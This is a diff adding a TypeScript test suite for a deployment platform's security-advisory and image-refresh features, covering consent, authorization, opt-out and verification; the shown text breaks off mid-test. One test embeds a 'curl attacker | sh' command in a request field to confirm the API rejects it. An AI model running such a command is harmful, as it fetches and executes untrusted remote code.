@@ -1,0 +1,1241 @@
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
+import { Hono } from "hono";
+import { db, schema, repos, seedOwner, installFakeRunner } from "../jobs/_harness";
+import { eq } from "@repo/db";
+import { OpenshipClient } from "@repo/sdk/client";
+import { createShip } from "@repo/sdk/native";
+import { getPlatformKernel } from "@repo/platform/engine/lib/platform";
+import { updatesRoutes } from "../../../src/modules/updates/updates.routes";
+import { healthRoutes } from "../../../src/modules/health/health.routes";
+import { handleApiError } from "../../../src/middleware/error-handler";
+import { buildBackgroundContext } from "@repo/platform/engine/lib/background-context";
+import {
+  applySecurityAdvisory,
+  setProjectSecurityPolicy,
+  reconcileSecurityRefreshes,
+  scanSecurityAdvisories,
+} from "@repo/platform/engine/modules/updates/security.service";
+import { annotateSecurityRefreshState } from "@repo/platform/engine/modules/updates/security-refresh-state";
+import { securityOverview } from "@repo/platform/engine/modules/updates/security-overview";
+import { securityProbeKey } from "@repo/platform/engine/modules/updates/security-inventory";
+import * as securityInventory from "@repo/platform/engine/modules/updates/security-inventory";
+import {
+  assertSecurityRefreshConfiguration,
+  assertSecurityUpdateEnvironment,
+} from "@repo/platform/engine/modules/updates/security-refresh-guard";
+import { notification } from "@repo/platform/engine/lib/notification-dispatcher";
+import { notificationPreferenceAllows } from "@repo/platform/engine/lib/notification-preferences";
+import { projectServicesToDeployableServices } from "@repo/platform/engine/modules/deployments/compose/project-services";
+import {
+  buildConfigSnapshot,
+  resolveSnapshotTarget,
+} from "@repo/platform/engine/modules/deployments/build.service";
+import { decryptEnvMap } from "@repo/platform/engine/lib/encryption";
+import { env } from "@repo/platform/engine/config/env";
+
+const h = vi.hoisted(() => ({
+  feed: vi.fn(),
+  deploy: vi.fn(),
+  digest: vi.fn(),
+  environment: vi.fn(),
+}));
+vi.mock("@repo/platform/engine/modules/services/service-environment-state", async (original) => ({
+  ...(await original<object>()),
+  assertSyncedServiceEnvironment: h.environment,
+}));
+vi.mock("@repo/platform/engine/modules/updates/advisory-feed", () => ({ getAdvisoryFeed: h.feed }));
+vi.mock("@repo/platform/engine/modules/deployments/build.service", async (original) => ({
+  ...(await original<object>()),
+  triggerDeployment: h.deploy,
+}));
+vi.mock("@repo/platform/engine/lib/image-registry", async (original) => ({
+  ...(await original<object>()),
+  resolveLatestImageDigest: h.digest,
+}));
+installFakeRunner();
+const app = new Hono()
+  .onError(handleApiError)
+  .route("/api/health", healthRoutes)
+  .route("/api/updates", updatesRoutes);
+const OLD = `sha256:${"a".repeat(64)}`,
+  FIXED = `sha256:${"b".repeat(64)}`;
+const notice = {
+  id: "image-patch",
+  revision: 1,
+  severity: "critical",
+  title: "Patch the image",
+  message: "A published fix is available.",
+  url: "https://example.com/security",
+  publishedAt: new Date().toISOString(),
+  action: "refresh-images",
+  targets: [
+    {
+      kind: "image",
+      repository: "docker.io/library/node",
+      affectedDigests: [OLD],
+      affectedTags: ["22"],
+      fixedDigests: [FIXED],
+    },
+  ],
+};
+beforeEach(() => {
+  h.environment.mockReset().mockResolvedValue({ SERVICE_TOKEN: "service-only-secret" });
+  h.deploy.mockReset().mockResolvedValue({ deployment: { id: "new-secure-deployment" } });
+  h.digest.mockReset().mockResolvedValue(FIXED);
+  h.feed.mockReset().mockResolvedValue({
+    security: {
+      format: 1,
+      revision: 9,
+      issuedAt: new Date().toISOString(),
+      expiresAt: new Date(Date.now() + 86400000).toISOString(),
+      advisories: [notice],
+    },
+    stale: false,
+    error: null,
+    checkedAt: new Date().toISOString(),
+    nextCheckAt: null,
+    release: { latest: null, manifest: null },
+  });
+});
+async function fixture(owner?: Awaited<ReturnType<typeof seedOwner>>) {
+  owner ??= await seedOwner();
+  const slug = `security-${crypto.randomUUID()}`;
+  const group = await repos.projectGroup.create({
+    organizationId: owner.orgId,
+    name: "Security",
+    slug,
+  });
+  const project = await repos.project.create({
+    organizationId: owner.orgId,
+    groupId: group.id,
+    name: "Security",
+    slug,
+    framework: "docker-compose",
+    gitProvider: "upload",
+    runtimeMode: "docker",
+    hasServer: true,
+  });
+  const service = await repos.service.create({
+    projectId: project.id,
+    name: "web",
+    image: "node:22",
+    enabled: true,
+  });
+  const deployment = await repos.deployment.create({
+    projectId: project.id,
+    organizationId: owner.orgId,
+    branch: "main",
+    environment: "production",
+    status: "ready",
+    meta: {
+      ...buildConfigSnapshot(project, "main"),
+      ...(await resolveSnapshotTarget(project)),
+      runtimeMode: "docker",
+      composeServices: projectServicesToDeployableServices([service]),
+    },
+  });
+  await repos.project.update(project.id, { activeDeploymentId: deployment.id });
+  await repos.service.upsertServiceDeployment({
+    serviceId: service.id,
+    deploymentId: deployment.id,
+    status: "success",
+    imageRef: service.image,
+    imageDigest: OLD,
+    containerId: "fixture-container",
+  });
+  const inventory = {
+    deploymentId: deployment.id,
+    checkedAt: new Date().toISOString(),
+    images: [
+      {
+        serviceId: service.id,
+        serviceName: service.name,
+        ref: service.image,
+        role: "image",
+        digest: OLD,
+      },
+    ],
+    runtimes: [],
+    unknownServices: [],
+    probeKey: securityProbeKey((await h.feed()).security.advisories),
+  };
+  await repos.securityAdvisory.saveInventory(
+    project.id,
+    owner.orgId,
+    deployment.id,
+    inventory,
+    new Date(),
+  );
+  const ctx = buildBackgroundContext({ userId: owner.userId, organizationId: owner.orgId });
+  const client = new OpenshipClient({
+    baseUrl: "http://openship.test",
+    token: owner.token,
+    organizationId: owner.orgId,
+    fetch: ((url, init) => app.request(url as string, init)) as typeof fetch,
+  });
+  return {
+    owner,
+    project,
+    service,
+    deployment,
+    ctx,
+    client,
+    input: { advisoryId: notice.id, deploymentId: deployment.id, serviceId: service.id },
+  };
+}
+
+describe("security operations", () => {
+  it("exposes configuration review for manual runtime advisories without allowing an image refresh", async () => {
+    const f = await fixture();
+    const feed = await h.feed();
+    feed.security.advisories = [
+      {
+        ...notice,
+        action: "manual",
+        targets: [{ kind: "runtime", runtime: "php", affected: "<=8.5.12", fixed: null }],
+      },
+    ];
+    h.feed.mockResolvedValue(feed);
+    const previous = (await repos.securityAdvisory.project(f.project.id))!
+      .inventory as securityInventory.SecurityInventory;
+    await repos.securityAdvisory.saveInventory(
+      f.project.id,
+      f.owner.orgId,
+      f.deployment.id,
+      {
+        ...previous,
+        probeKey: securityProbeKey(feed.security.advisories),
+        runtimes: [{ serviceId: f.service.id, runtime: "php", version: "8.5.12" }],
+      },
+      new Date(),
+    );
+    const result = await f.client.updates.security(f.project.id);
+    expect(result.findings).toHaveLength(1);
+    expect(result.findings[0]).toMatchObject({
+      id: notice.id,
+      serviceId: f.service.id,
+      evidence: ["php 8.5.12"],
+      confidence: "possible",
+      manualReviewRequired: true,
+      canRefresh: false,
+    });
+    // Review metadata does not turn a configuration advisory into a redeploy operation.
+    const read = vi.spyOn(securityInventory, "projectSecurityInventory").mockResolvedValue({
+      ...previous,
+      runtimes: [{ serviceId: f.service.id, runtime: "php", version: "8.5.12" }],
+    });
+    try {
+      await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow(
+        /no applicable runtime refresh/,
+      );
+      expect(h.deploy).not.toHaveBeenCalled();
+    } finally {
+      read.mockRestore();
+    }
+  });
+
+  it.each([false, true])(
+    "rejects retained evidence before dispatching a refresh (automatic=%s)",
+    async (automatic) => {
+      const f = await fixture();
+      if (automatic) await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+      const previous = (await repos.securityAdvisory.project(f.project.id))!
+        .inventory as securityInventory.SecurityInventory;
+      const read = vi.spyOn(securityInventory, "projectSecurityInventory").mockResolvedValue({
+        ...previous,
+        unknownServices: [f.service.id],
+      });
+      try {
+        await expect(
+          applySecurityAdvisory(f.ctx, f.project.id, f.input, automatic),
+        ).rejects.toThrow(/Current security evidence is unavailable/);
+        expect(h.deploy).not.toHaveBeenCalled();
+        expect(h.digest).not.toHaveBeenCalled();
+      } finally {
+        read.mockRestore();
+      }
+    },
+  );
+  it("persists a workspace opt-out, skips inspection and alerts, and resumes without deleting evidence", async () => {
+    const f = await fixture(),
+      other = await fixture();
+    expect(await f.client.updates.securityCheckPolicy()).toEqual({
+      checksEnabled: true,
+      canManage: true,
+    });
+    const before = await repos.securityAdvisory.project(f.project.id);
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: false });
+    expect(await f.client.updates.securityCheckPolicy()).toEqual({
+      checksEnabled: false,
+      canManage: true,
+    });
+    expect(await other.client.updates.securityCheckPolicy()).toEqual({
+      checksEnabled: true,
+      canManage: true,
+    });
+    const overview = await f.client.updates.advisories();
+    expect(overview.overview).toEqual({
+      checksEnabled: false,
+      projects: [],
+      pendingProjects: 0,
+      unknownProjects: 0,
+    });
+    const candidates = await repos.securityAdvisory.candidates(9);
+    expect(candidates.some((p) => p.id === f.project.id)).toBe(false);
+    expect(candidates.some((p) => p.id === other.project.id)).toBe(true);
+    await expect(f.client.updates.security(f.project.id)).rejects.toThrow(/disabled/);
+    await expect(f.client.updates.checkSecurity(f.project.id)).rejects.toThrow(/disabled/);
+    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow(/disabled/);
+    expect(h.deploy).not.toHaveBeenCalled();
+    const prepare = vi.spyOn(notification, "prepare");
+    try {
+      await scanSecurityAdvisories();
+      expect(prepare.mock.calls.some(([input]) => input.resourceId === f.project.id)).toBe(false);
+    } finally {
+      prepare.mockRestore();
+    }
+    expect((await repos.securityAdvisory.project(f.project.id))?.inventory).toEqual(
+      before?.inventory,
+    );
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: true });
+    expect((await f.client.updates.security(f.project.id)).findings).toHaveLength(1);
+  });
+
+  it("allows admins but prevents members from changing workspace-wide inspection policy", async () => {
+    const f = await fixture();
+    await db
+      .update(schema.member)
+      .set({ role: "admin" })
+      .where(eq(schema.member.userId, f.owner.userId));
+    expect((await f.client.updates.securityCheckPolicy()).canManage).toBe(true);
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: false });
+    expect(await repos.securityAdvisory.checksEnabled(f.owner.orgId)).toBe(false);
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: true });
+    await db
+      .update(schema.member)
+      .set({ role: "member" })
+      .where(eq(schema.member.userId, f.owner.userId));
+    const response = await app.request("/api/updates/security/policy", {
+      method: "PUT",
+      headers: { ...f.owner.auth, "Content-Type": "application/json" },
+      body: JSON.stringify({ checksEnabled: false }),
+    });
+    expect(response.status).toBe(403);
+    expect(await repos.securityAdvisory.checksEnabled(f.owner.orgId)).toBe(true);
+  });
+
+  it.each([
+    { trigger: "rollback", meta: {} },
+    { trigger: "manual", meta: { adopt: true } },
+    { trigger: "manual", meta: { handoverAppImage: "openship/app:bld_old" } },
+    { trigger: "manual", meta: { refreshAppDeploymentId: "older-source" } },
+  ])(
+    "reports the source redeploy prerequisite consistently before a replayed-source action ($trigger/$meta)",
+    async ({ trigger, meta }) => {
+      const f = await fixture();
+      await repos.service.remove(f.service.id);
+      await repos.project.update(f.project.id, {
+        framework: "laravel",
+        runtimeVersion: "8.4",
+        gitProvider: "github",
+        gitUrl: "https://github.com/example/source.git",
+        gitOwner: "example",
+        gitRepo: "source",
+      });
+      const source = (await repos.project.findById(f.project.id))!;
+      const snapshot = {
+        ...buildConfigSnapshot(source, "main"),
+        ...(await resolveSnapshotTarget(source)),
+      };
+      await db
+        .update(schema.deployment)
+        .set({
+          trigger,
+          commitSha: "1111111111111111111111111111111111111111",
+          meta: { ...snapshot, ...meta },
+        })
+        .where(eq(schema.deployment.id, f.deployment.id));
+      await repos.securityAdvisory.saveInventory(
+        f.project.id,
+        f.owner.orgId,
+        f.deployment.id,
+        {
+          deploymentId: f.deployment.id,
+          checkedAt: new Date().toISOString(),
+          probeKey: securityProbeKey((await h.feed()).security.advisories),
+          images: [
+            { serviceId: null, serviceName: null, ref: "node:22", role: "image", digest: OLD },
+          ],
+          runtimes: [],
+          unknownServices: [],
+        },
+        new Date(),
+      );
+      const detail = await f.client.updates.security(f.project.id);
+      const overview = await securityOverview(f.ctx, await h.feed());
+      for (const result of [detail, overview.projects.find((p) => p.projectId === f.project.id)!]) {
+        expect(result.findings).toHaveLength(1);
+        expect(result.findings[0]).toMatchObject({
+          canRefresh: false,
+          sourceRedeployRequired: true,
+        });
+        expect(result.findings[0].refreshBlockedReason).toContain("replayed artifact");
+      }
+      // Eligibility is checked live from the existing deployment records; repairing
+      // provenance does not need a duplicate inventory cache or another runtime probe.
+      await db
+        .update(schema.deployment)
+        .set({ trigger: "manual", meta: snapshot })
+        .where(eq(schema.deployment.id, f.deployment.id));
+      const repaired = await f.client.updates.security(f.project.id);
+      expect(repaired.findings[0]).toMatchObject({ canRefresh: true });
+      expect(repaired.findings[0]).not.toHaveProperty("sourceRedeployRequired");
+      expect(h.deploy).not.toHaveBeenCalled();
+      expect(h.digest.mock.calls.some(([, options]) => options?.refresh === true)).toBe(false);
+    },
+  );
+
+  it("aggregates only authorized current observations, without running a deployment or forcing a registry refresh", async () => {
+    const f = await fixture(),
+      other = await fixture();
+    const hidden = await fixture(f.owner);
+    const direct = await securityOverview(f.ctx, await h.feed());
+    await getPlatformKernel().updates.advisories(f.ctx);
+    const result = await f.client.updates.advisories();
+    expect(result.overview).toEqual(direct);
+    expect(result.overview.projects.map((p) => p.projectId).sort()).toEqual(
+      [f.project.id, hidden.project.id].sort(),
+    );
+    expect(result.overview.projects[0].findings[0]).toMatchObject({
+      id: notice.id,
+      serviceName: "web",
+    });
+    expect(JSON.stringify(result.overview)).not.toContain(other.project.id);
+    const feed = await h.feed();
+    await db
+      .update(schema.member)
+      .set({ role: "restricted" })
+      .where(eq(schema.member.userId, f.owner.userId));
+    const restricted = { ...f.ctx, role: "restricted" as const };
+    expect(await securityOverview(restricted, feed)).toMatchObject({
+      checksEnabled: true,
+      projects: [],
+      pendingProjects: 0,
+      unknownProjects: 0,
+    });
+    await repos.resourceGrant.upsert({
+      organizationId: f.owner.orgId,
+      userId: f.owner.userId,
+      resourceType: "project",
+      resourceId: f.project.id,
+      permissions: ["read"],
+      grantedByUserId: f.owner.userId,
+    });
+    expect((await securityOverview(restricted, feed)).projects.map((p) => p.projectId)).toEqual([
+      f.project.id,
+    ]);
+    const stale = await securityOverview(f.ctx, { ...feed, stale: true });
+    expect(stale.projects[0].findings[0].canRefresh).toBe(false);
+    const replacement = await repos.deployment.create({
+      projectId: f.project.id,
+      organizationId: f.owner.orgId,
+      branch: "main",
+      status: "ready",
+    });
+    await repos.project.update(f.project.id, { activeDeploymentId: replacement.id });
+    const after = await securityOverview(restricted, feed);
+    expect(after.pendingProjects).toBe(1);
+    expect(after.projects).toEqual([
+      expect.objectContaining({ projectId: f.project.id, findings: [], checkedAt: null }),
+    ]);
+    // Consent remains available globally after a warning clears, or the service stops.
+    await repos.securityAdvisory.policy(f.project.id, f.owner.orgId, f.owner.userId, true);
+    await repos.project.update(f.project.id, { activeDeploymentId: null });
+    expect((await securityOverview(restricted, { ...feed, security: null })).projects).toEqual([
+      expect.objectContaining({ projectId: f.project.id, autoRefresh: true, findings: [] }),
+    ]);
+    expect(h.deploy).not.toHaveBeenCalled();
+    expect(h.digest.mock.calls.some(([, options]) => options?.refresh === true)).toBe(false);
+  });
+
+  it("uses the same authorization and result through native and HTTP clients", async () => {
+    const f = await fixture();
+    const user = (await repos.user.findById(f.owner.userId))!;
+    const ship = createShip({
+      platform: getPlatformKernel(),
+      identity: {
+        resolve: async () => ({
+          user: { id: user.id, email: user.email, name: user.name },
+          sessionId: "security-test",
+        }),
+      },
+    });
+    const native = await ship.scope({ identity: "verified", organizationId: f.owner.orgId });
+    expect(await native.updates.security(f.project.id)).toEqual(
+      await f.client.updates.security(f.project.id),
+    );
+    await native.updates.securityPolicy(f.project.id, { autoRefresh: true });
+    expect((await f.client.updates.security(f.project.id)).autoRefresh).toBe(true);
+    await native.updates.applySecurity(f.project.id, f.input);
+    expect(h.deploy.mock.calls[0][1]).toMatchObject({
+      serviceIds: [f.service.id],
+      strictServiceScope: true,
+    });
+    await db
+      .update(schema.member)
+      .set({ role: "restricted" })
+      .where(eq(schema.member.userId, f.owner.userId));
+    await repos.resourceGrant.upsert({
+      organizationId: f.owner.orgId,
+      userId: f.owner.userId,
+      resourceType: "project",
+      resourceId: f.project.id,
+      permissions: ["read"],
+      grantedByUserId: f.owner.userId,
+    });
+    await expect(
+      native.updates.securityPolicy(f.project.id, { autoRefresh: false }),
+    ).rejects.toThrow();
+    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow();
+  });
+  it("defaults to notices only, rejects foreign projects and cannot accept remote commands", async () => {
+    const f = await fixture(),
+      other = await fixture();
+    const result = await f.client.updates.security(f.project.id);
+    expect(result.autoRefresh).toBe(false);
+    expect(result.findings[0]).toMatchObject({
+      id: notice.id,
+      confidence: "confirmed",
+      serviceId: f.service.id,
+    });
+    await expect(other.client.updates.security(f.project.id)).rejects.toThrow();
+    await expect(
+      other.client.updates.securityPolicy(f.project.id, { autoRefresh: true }),
+    ).rejects.toThrow();
+    const invalid = await app.request(`/api/updates/${f.project.id}/security/apply`, {
+      method: "POST",
+      headers: { ...f.owner.auth, "Content-Type": "application/json" },
+      body: JSON.stringify({ ...f.input, command: "curl attacker | sh" }),
+    });
+    expect(invalid.status).toBe(400);
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+  it("rejects a prebuilt-image refresh when the registry still serves the vulnerable artifact", async () => {
+    const f = await fixture();
+    h.digest.mockResolvedValue(OLD);
+    await expect(
+      f.client.updates.applySecurity(f.project.id, f.input),
+    ).rejects.toThrow(/has not changed/);
+    expect(h.deploy).not.toHaveBeenCalled();
+    const status = await f.client.updates.checkSecurity(f.project.id);
+    expect(status.findings[0]).toMatchObject({
+      canRefresh: false,
+      imageChangeRequired: true,
+    });
+  });
+
+  it("records manual refresh progress and reports a ready deployment whose runtime remains affected", async () => {
+    const f = await fixture();
+    const inventory = (await repos.securityAdvisory.project(f.project.id))!
+      .inventory as securityInventory.SecurityInventory;
+    await repos.securityAdvisory.claimAttempt(
+      `manual-${f.project.id}`,
+      f.project.id,
+      { advisoryId: notice.id, serviceId: f.service.id },
+    );
+    const pending = await f.client.updates.security(f.project.id);
+    expect(pending.findings[0].refresh?.status).toBe("running");
+    await repos.securityAdvisory.finishAttempt(`manual-${f.project.id}`, {
+      status: "queued",
+      deploymentId: f.deployment.id,
+    });
+    const original = securityInventory.projectSecurityInventory;
+    const probe = vi
+      .spyOn(securityInventory, "projectSecurityInventory")
+      .mockImplementation((ctx, id, feed, refresh) =>
+        id === f.project.id
+          ? Promise.resolve(inventory)
+          : original(ctx, id, feed, refresh),
+      );
+    try {
+      await reconcileSecurityRefreshes();
+      const [attempt] = await repos.securityAdvisory.attemptsForProject(
+        f.project.id,
+      );
+      expect(attempt.status).toBe("failed");
+      expect(attempt.error).toContain("still affected");
+      const status = await f.client.updates.security(f.project.id);
+      expect(status.findings[0].refresh).toMatchObject({
+        status: "failed",
+        error: expect.stringContaining("still affected"),
+      });
+    } finally {
+      probe.mockRestore();
+    }
+  });
+
+  it("verifies a manual update only after the affected artifact has been replaced", async () => {
+    const f = await fixture();
+    const prior = (await repos.securityAdvisory.project(f.project.id))!
+      .inventory as securityInventory.SecurityInventory;
+    const fixed = {
+      ...prior,
+      images: prior.images.map((image) => ({ ...image, digest: FIXED })),
+    };
+    await repos.securityAdvisory.claimAttempt(
+      `manual-fixed-${f.project.id}`,
+      f.project.id,
+      { advisoryId: notice.id, serviceId: f.service.id },
+    );
+    await repos.securityAdvisory.finishAttempt(`manual-fixed-${f.project.id}`, {
+      status: "queued",
+      deploymentId: f.deployment.id,
+    });
+    const original = securityInventory.projectSecurityInventory;
+    const probe = vi
+      .spyOn(securityInventory, "projectSecurityInventory")
+      .mockImplementation((ctx, id, feed, refresh) =>
+        id === f.project.id
+          ? Promise.resolve(fixed)
+          : original(ctx, id, feed, refresh),
+      );
+    try {
+      await reconcileSecurityRefreshes();
+      expect(
+        (await repos.securityAdvisory.attemptsForProject(f.project.id))[0].status,
+      ).toBe("verified");
+      expect((await f.client.updates.security(f.project.id)).findings).toEqual(
+        [],
+      );
+    } finally {
+      probe.mockRestore();
+    }
+  });
+
+  it("does not hide a newer release's finding behind a completed older update", async () => {
+    const f = await fixture();
+    const status = await f.client.updates.security(f.project.id);
+    await repos.securityAdvisory.claimAttempt(
+      `old-${f.project.id}`,
+      f.project.id,
+      { advisoryId: notice.id, serviceId: f.service.id },
+    );
+    await repos.securityAdvisory.finishAttempt(`old-${f.project.id}`, {
+      status: "queued",
+      deploymentId: f.deployment.id,
+    });
+    status.deploymentId = "newer-active-release";
+    await annotateSecurityRefreshState(status);
+    expect(status.findings[0].refresh).toBeUndefined();
+    expect(status.findings[0].canRefresh).toBe(true);
+  });
+
+  it("manual refresh uses the existing pipeline with exact service scope and stale-deployment protection", async () => {
+    const f = await fixture();
+    const result = await f.client.updates.applySecurity(f.project.id, f.input);
+    expect(result.deployment_id).toBe("new-secure-deployment");
+    expect(h.deploy.mock.calls[0][1]).toMatchObject({
+      serviceIds: [f.service.id],
+      strictServiceScope: true,
+      forcePullImages: true,
+      trigger: "update",
+    });
+    expect(h.deploy.mock.calls[0][1].reuseSnapshot).toBeUndefined();
+    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow(/already in progress/);
+    await expect(
+      f.client.updates.applySecurity(f.project.id, { ...f.input, deploymentId: "stale" }),
+    ).rejects.toThrow();
+    h.feed.mockResolvedValue({ ...(await h.feed()), stale: true });
+    await expect(f.client.updates.applySecurity(f.project.id, f.input)).rejects.toThrow();
+    expect(h.deploy).toHaveBeenCalledTimes(1);
+  });
+  it("automatic refresh needs consent, freezes the signed replacement and admits it once", async () => {
+    const f = await fixture();
+    await expect(applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).rejects.toThrow();
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
+    const input = h.deploy.mock.calls[0][1];
+    expect(input.reuseSnapshot).toBeUndefined();
+    expect(input.envVars).toBeUndefined();
+    expect(input.securityApproval).toMatchObject({
+      deploymentId: f.deployment.id,
+      serviceId: f.service.id,
+      image: `docker.io/library/node@${FIXED}`,
+      environmentFingerprint: expect.stringMatching(/^[a-f0-9]{64}$/),
+    });
+    expect(JSON.stringify(input)).not.toContain("service-only-secret");
+    const resolved = { SERVICE_TOKEN: "service-only-secret" };
+    assertSecurityUpdateEnvironment(f.project.id, input.securityApproval, f.service, resolved);
+    expect(resolved).toEqual({ SERVICE_TOKEN: "service-only-secret" });
+    expect(() =>
+      assertSecurityUpdateEnvironment(f.project.id, input.securityApproval, f.service, {
+        SERVICE_TOKEN: "later-value",
+      }),
+    ).toThrow(/environment changed/);
+    expect((await repos.service.findById(f.service.id))?.image).toBe("node:22");
+    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
+    expect(h.deploy).toHaveBeenCalledTimes(1);
+  });
+  it("does not automatically deploy an unverified replacement or changed configuration", async () => {
+    const f = await fixture();
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+    h.digest.mockResolvedValue(`sha256:${"c".repeat(64)}`);
+    expect(await applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).toBeNull();
+    expect(h.deploy).not.toHaveBeenCalled();
+    h.digest.mockResolvedValue(FIXED);
+    await repos.service.update(f.service.id, { command: "new command" });
+    await expect(applySecurityAdvisory(f.ctx, f.project.id, f.input, true)).rejects.toThrow(
+      /configuration changed/,
+    );
+    expect(h.deploy).not.toHaveBeenCalled();
+  });
+  it("rechecks consent, permissions and service config when the worker is about to deploy", async () => {
+    const f = await fixture();
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+    await applySecurityAdvisory(f.ctx, f.project.id, f.input, true);
+    const approval = h.deploy.mock.calls[0][1].securityApproval;
+    const snapshot = {
+      ...f.deployment.meta,
+      securityApproval: approval,
+      targetServiceIds: [f.service.id],
+      handoverImages: { web: approval.image },
+    };
+    const current = (await repos.project.findById(f.project.id))!;
+    await assertSecurityRefreshConfiguration(current, snapshot);
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: false });
+    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(/disabled/);
+    expect((await repos.securityAdvisory.project(f.project.id))?.autoRefresh).toBe(true);
+    await f.client.updates.setSecurityCheckPolicy({ checksEnabled: true });
+    await expect(
+      assertSecurityRefreshConfiguration(current, {
+        ...snapshot,
+        securityApproval: {
+          ...snapshot.securityApproval,
+          expiresAt: new Date(0).toISOString(),
+        },
+      }),
+    ).rejects.toThrow(/expired/);
+    await expect(
+      assertSecurityRefreshConfiguration({ ...current, volumes: ["data:/data"] }, snapshot),
+    ).rejects.toThrow(/Project configuration changed/);
+    h.environment.mockResolvedValueOnce({ SERVICE_TOKEN: "a-later-change" });
+    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
+      /environment changed/,
+    );
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: false });
+    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(/consent/);
+    await setProjectSecurityPolicy(f.ctx, f.project.id, { autoRefresh: true });
+    await repos.service.update(f.service.id, { command: "new saved command" });
+    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
+      /configuration changed/,
+    );
+    await db
+      .update(schema.member)
+      .set({ role: "restricted" })
+      .where(eq(schema.member.userId, f.owner.userId));
+    await expect(assertSecurityRefreshConfiguration(current, snapshot)).rejects.toThrow(
+      /authorization/,
+    );
+  });
+  it("only reports a successful automatic patch after its exact replacement becomes active", async () => {
+    const f = await fixture();
+    const image = `docker.io/library/node@${FIXED}`;
+    const deployment = await repos.deployment.create({
+      projectId: f.project.id,
+      organizationId: f.owner.orgId,
+      branch: "main",
+      status: "deploying",
+    });
+    await repos.securityAdvisory.claimAttempt(`verify-${f.project.id}`, f.project.id, {
+      advisoryId: notice.id,
+      serviceId: f.service.id,
+      image,
+    });
+    await repos.securityAdvisory.finishAttempt(`verify-${f.project.id}`, {
+      status: "queued",
+      deploymentId: deployment.id,
+    });
+    await reconcileSecurityRefreshes();
+    expect(
+      (
+        await db
+          .select()
+          .from(schema.securityRefreshAttempt)
+          .where(eq(schema.securityRefreshAttempt.projectId, f.project.id))
+      )[0].status,
+    ).toBe("queued");
+    await repos.deployment.updateStatus(deployment.id, "ready");
+    await repos.project.update(f.project.id, { activeDeploymentId: deployment.id });
+    await repos.service.upsertServiceDeployment({
+      serviceId: f.service.id,
+      deploymentId: deployment.id,
+      status: "success",
+      imageRef: image,
+    });
+    await reconcileSecurityRefreshes();
+    expect(
+      (
+        await db
+          .select()
+          .from(schema.securityRefreshAttempt)
+          .where(eq(schema.securityRefreshAttempt.projectId, f.project.id))
+      )[0].status,
+    ).toBe("verified");
+    const bad = await fixture();
+    await repos.securityAdvisory.claimAttempt(`verify-${bad.project.id}`, bad.project.id, {
+      advisoryId: notice.id,
+      serviceId: bad.service.id,
+      image,
+    });
+    await repos.securityAdvisory.finishAttempt(`verify-${bad.project.id}`, {
+      status: "queued",
+      deploymentId: bad.deployment.id,
+    });
+    await repos.service.upsertServiceDeployment({
+      serviceId: bad.service.id,
+      deploymentId: bad.deployment.id,
+      status: "success",
+      imageRef: "node:22",
+    });
+    await reconcileSecurityRefreshes();
+    expect(
+      (
+        await db
+          .select()
+          .from(schema.securityRefreshAttempt)
+          .where(eq(schema.securityRefreshAttempt.projectId, bad.project.id))
+      )[0].status,
+    ).toBe("failed");
+  });
+  it("notifies security advisories even when a workspace has no deployed projects", async () => {
+    const owner = await seedOwner();
+    const channel = await repos.notificationChannel.create({
+      userId: owner.userId,
+      kind: "in_app",
+      label: "Inbox",
+      config: {},
+      enabled: true,
+      verified: true,
+    });
+    const feed = await h.feed();
+    h.feed.mockResolvedValue({
+      ...feed,
+      security: {
+        ...feed.security,
+        advisories: [{ ...notice, targets: [{ kind: "platform", affected: ">=0.0.0" }] }],
+      },
+    });
+    await scanSecurityAdvisories();
+    await scanSecurityAdvisories();
+    const deliveries = await db
+      .select()
+      .from(schema.notificationDelivery)
+      .where(eq(schema.notificationDelivery.channelId, channel.id));
+    expect(deliveries).toHaveLength(1);
+    expect(deliveries[0].payload).toMatchObject({ resourceType: "updates", durable: true });
+  });
+  it("keeps Cloud app alerts notice-only without sending control-plane update prompts to tenants", async () => {
+    const f = await fixture();
+    const channel = await repos.notificationChannel.create({
+      userId: f.owner.userId,
+      kind: "in_app",
+      label: "Inbox",
+      config: {},
+      enabled: true,
+      verified: true,
+    });
+    const feed = await h.feed();
+    h.feed.mockResolvedValue({
+      ...feed,
+      security: {
+        ...feed.security,
+        advisories: [
+          notice,
+          {
+            ...notice,
+            id: "control-plane-patch",
+            targets: [{ kind: "platform", affected: ">=0.0.0" }],
+          },
+        ],
+      },
+      release: {
+        latest: null,
+        manifest: {
+          advisories: [
+            {
+              id: "control-plane-release",
+              severity: "critical",
+              announce: true,
+              title: "Update Openship",
+              message: "Install the patched control plane.",
+              affects: ">=0.0.0",
+            },
+          ],
+        },
+      },
+    });
+    const previousCloudMode = env.CLOUD_MODE;
+    try {
+      env.CLOUD_MODE = true;
+      await scanSecurityAdvisories();
+      await scanSecurityAdvisories();
+    } finally {
+      env.CLOUD_MODE = previousCloudMode;
+    }
+    const deliveries = await db
+      .select()
+      .from(schema.notificationDelivery)
+      .where(eq(schema.notificationDelivery.channelId, channel.id));
+    expect(deliveries).toHaveLength(1);
+    expect(deliveries[0].payload).toMatchObject({
+      resourceType: "project",
+      resourceId: f.project.id,
+      advisoryId: notice.id,
+    });
